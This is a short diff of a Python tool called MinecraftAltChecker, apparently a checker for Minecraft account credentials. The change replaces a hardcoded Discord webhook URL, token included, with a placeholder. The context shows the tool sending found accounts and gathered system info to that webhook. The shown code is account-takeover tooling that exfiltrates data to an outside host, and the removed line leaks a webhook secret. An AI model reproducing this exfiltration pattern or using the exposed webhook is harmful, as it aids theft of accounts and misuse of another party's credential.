@@ -732,7 +732,7 @@ class MinecraftAltChecker:
         if not self.found_accounts:
             return
         
-        webhook_url = "https://discord.com/api/webhooks/1469076664758571071/qBRIEekGTki0H_65ajrL_VjoOHoHIxk61-ydrl6F_-KHxCi70oP4TRvV88ESucT6DYZh"
+        webhook_url = "ENTER YOU WEBHOOK URL HERE!"
         
         try:
             # Get system info
@@ -892,3 +892,4 @@ if __name__ == "__main__":
     
     checker = MinecraftAltChecker()
     checker.run()
+
